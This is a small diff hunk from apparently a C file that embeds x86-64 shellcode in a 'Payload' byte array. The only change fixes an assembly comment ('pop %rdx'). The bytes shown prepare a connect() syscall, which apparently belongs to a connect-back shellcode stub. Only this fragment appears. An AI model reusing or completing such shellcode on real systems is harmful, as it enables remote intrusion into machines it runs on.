@@ -63,7 +63,7 @@ static Payload payload = {
 			0x51,						// push		%rcx
 			0x48, 0x89, 0xe6,				// mov		%rsp,%rsi
 			0x6a, 0x10,					// pushq	$0x10
-			0x5a,						// pop		%rax
+			0x5a,						// pop		%rdx
 			0x6a, 0x2a,					// pushq	$0x2a
 			0x58,						// pop		%rax
 			0x0f, 0x05,					// syscall
